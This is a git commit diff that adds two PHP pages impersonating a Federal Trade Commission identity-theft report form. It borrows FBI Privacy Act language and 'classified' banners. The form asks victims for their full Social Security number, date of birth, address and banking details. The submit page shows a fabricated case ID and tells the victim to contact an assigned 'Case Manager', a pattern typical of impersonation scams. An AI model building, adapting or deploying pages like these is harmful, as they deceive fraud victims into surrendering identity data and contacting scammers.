9464ee2abdb2085a48f5fcced84dc0b43130a236
robinmccain <robinmccain1960@gmail.com>
2025-03-10 23:52:35 +0530

    Uploaded Form

---
+++ api/index.php
@@ -0,0 +1,177 @@
+
+<!DOCTYPE html>
+    <html lang="en">
+        <head>
+            <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Extended" rel="stylesheet" nonce="wZnNxupm1grp1MudS9CKBA">
+                <title>Report to help fight fraud ! </title>
+            <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,500|Roboto:300,400,400i,500,700&subset=latin,vietnamese,latin-ext,cyrillic,greek,cyrillic-ext,greek-ext" rel="stylesheet" nonce="wZnNxupm1grp1MudS9CKBA">
+            <link rel="stylesheet" href="../css/style.css" />
+        </head>
+        
+        <body>
+            <div class="wrapper">
+                <div class="header">
+                    <img src="../images/logo.jpg" class="logo" />
+                </div>
+
+                <div class="container">
+                    <div class="title">
+                        <h2>Fill the form if you are a victim of Identity Theft / Cyber Crime / Financial Fraud ! </h2>
+                        <h4>
+                            Please share as much as you know. The details help law enforcement investigations. After you hit submit please talk to the assigned Case Manager for further information regarding your case.
+                        </h4>
+                        <hr />
+                        <p style="color:red">* Indicates required questions</p>
+                    </div>
+
+                    <div style="text-align:center; color:red">
+                        <p>FORM//CLASSIFIED</p>
+                    </div>
+
+                    <div class="form">
+                        <form action="submit.php" method="post">
+                            <div class="form-field">
+                                <h2>Name <span>*</span></h2>
+                                <div><input type="text" required placeholder="Enter your complete name here"/></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Phone Number <span>*</span></h2>
+                                <div><input type="tel" id="phoneNum" required placeholder="Enter your phone number" /></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>DOB <span>*</span></h2>
+                                <div><input type="date" required /></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Email Address <span>*</span></h2>
+                                <div><input type="email" placeholder="Enter your email address" required /></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Residential Address <span>*</span></h2>
+                                <div><textarea required></textarea></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Your Complete Social Security Number <span>*</span></h2>
+                                <div><input type="number" required placeholder="xxx-xx-xxxx " /></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Do you do Online Banking ? <span>*</span></h2>
+                                <div>
+                                    <p>
+                                        <input type="radio" name="banking"/>Yes
+                                    </p>
+                                    <p>
+                                        <input type="radio" name="banking"/>No
+                                    </p>
+                                    <p>
+                                        <input type="radio" name="banking"/>Maybe
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Incident Description <span>*</span></h2>
+                                <h2>When was this incident detected ? </h2>
+                                <div><input type="text" required /></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>
+                                    Please enter a brief description of the incident: as anything you can tell us about your experience is helpful. Please share as much or as little information as you'd like.
+                                </h2>
+                                <div><textarea></textarea></div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>
+                                    From which timezone are you filing this report ? <span>*</span>
+                                </h2>
+                                <div><input type="text" required placeholder="Enter your current timezone" /></div>
+                            </div>
+
+
+                            <div class="form-field">
+                                <h2>
+                                    Was the confidentiality, integrity, and/or availability of your organization's information systems potentially compromised ?
+                                </h2>
+                                <div>
+                                    <p>
+                                        <input type="radio" name="compromise"/>Yes
+                                    </p>
+                                    <p>
+                                        <input type="radio" name="compromise"/>No
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Has someone used your information to commit fraud ? <span>*</span></h2>
+                                <div>
+                                    <p>
+                                        <input type="radio" name="banking"/>Yes
+                                    </p>
+                                    <p>
+                                        <input type="radio" name="banking"/>No
+                                    </p>
+                                    <p>
+                                        <input type="radio" name="banking"/>Maybe
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>
+                                    Technician Details <span>*</span>
+                                </h2>
+                                <div>
+                                    <p><input type="text" style="margin-bottom:15px" required placeholder="Technician's Name" /></p>
+                                    <p><input type="text" style="margin-bottom:15px" required placeholder="Employee ID" /></p>
+                                    <p><input type="text" style="margin-bottom:15px" required placeholder="Organization's Name" /></p>
+                                
+                                </div>
+                            </div>
+
+                            <div class="form-field">
+                                <h2>Privacy Act Statement</h2>
+                                <p style="font-size:12px">
+                                    The collection of information on this form is authorized by one or more of the following statutes: 18 U.S.C. § 1028 (false documents and identity theft); 1028A (aggravated identity theft); 18 U.S.C. § 1029 (credit card fraud); 18 U.S.C. § 1030 (computer fraud); 18 U.S.C. § 1343 (wire fraud); 18 U.S.C 2318B (counterfeit and illicit labels); 18 U.S.C. § 2319 (violation of intellectual property rights); 28 U.S.C. § 533 (FBI authorized to investigate violations of federal law for which it has primary investigative jurisdiction); and 28 U.S.C. § 534 (FBI authorized to collect and maintain identification, criminal information, crime, and other records).
+
+                                    The collection of this information is relevant and necessary to document and investigate complaints of Internet-related crime. Submission of the information requested is voluntary; however, your failure to supply requested information may impede or preclude the investigation of your complaint by law enforcement agencies.
+
+                                    The information collected is maintained in one or more of the following Privacy Act Systems of Records: the FBI Central Records System, Justice/FBI-002, notice of which was published in the Federal Register at 63 Fed. Reg. 8671 (Feb. 20, 1998); the FBI Data Warehouse System, DOJ/FBI-022, notice of which was published in the Federal Register at 77 Fed. Reg. 40631 (July 10, 2012). Descriptions of these systems may also be found at www.justice.gov/opcl/doj-systems-records#FBI. The information collected may be disclosed in accordance with the routine uses referenced in those notices or as otherwise permitted by law. In accordance with those routine uses, the FBI may disclose information from my complaint to appropriate federal, state, local, tribal or international law enforcement and regulatory agencies.
+                                </p>
+
+                            </div>
+
+                            <input type="submit" value="Submit" name="submit" />
+
+                        </form>
+                    </div>
+                </div>
+
+                
+                <div style="text-align:center; color:red;margin:15px 0px">
+                    <p>FORM//CLASSIFIED</p>
+                </div>
+    
+            </div>
+            <footer>
+                <p>&copy; Federal Trade Commission 1914-2024</p>
+            </footer>
+        </body>
+        <script>
+           let phone2 = document.getElementById('phoneNum');
+           phone2.onclick=changeDesign;
+           phone2.onfocus=changeDesign;
+
+           function changeDesign (){
+                phone2.value="(+1) - ";
+            }
+        </script>
+    </html>
---
+++ api/submit.php
@@ -0,0 +1,34 @@
+<!DOCTYPE html>
+    <html lang="en">
+        <head>
+            <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Extended" rel="stylesheet" nonce="wZnNxupm1grp1MudS9CKBA">
+                <title>Report to help fight fraud ! </title>
+            <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,500|Roboto:300,400,400i,500,700&subset=latin,vietnamese,latin-ext,cyrillic,greek,cyrillic-ext,greek-ext" rel="stylesheet" nonce="wZnNxupm1grp1MudS9CKBA">
+            <link rel="stylesheet" href="../css/style.css" />
+        </head>
+        
+        <body>
+            <div class="wrapper">
+                <div class="header">
+                    <img src="../images/logo.jpg" class="logo" />
+                </div>
+
+                <div class="container">
+                    <div class="title">
+                        <div style="display:flex;justify-content:center;align-items:center">
+                            <h1>Case Successfully Submitted </h1>
+                            <div style="margin-left:20px"><img style="height:60px" src="../images/check.png" /></div>
+                        </div>
+
+                        <div style="text-align:center; margin-top:30px">
+                            <p><span style="color:red">Case ID Generated </span>: 323-cv-02880-FTC</p>
+                            <p><span style="color:red">Case Manager Assigned </span>: Mr. Tony Smith </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer style="position:absolute;left:0;bottom:0;width:100%;background-color:#ddd">
+                <p>&copy; Federal Trade Commission 1914-2024</p>
+            </footer>
+        </body>
+    </html>
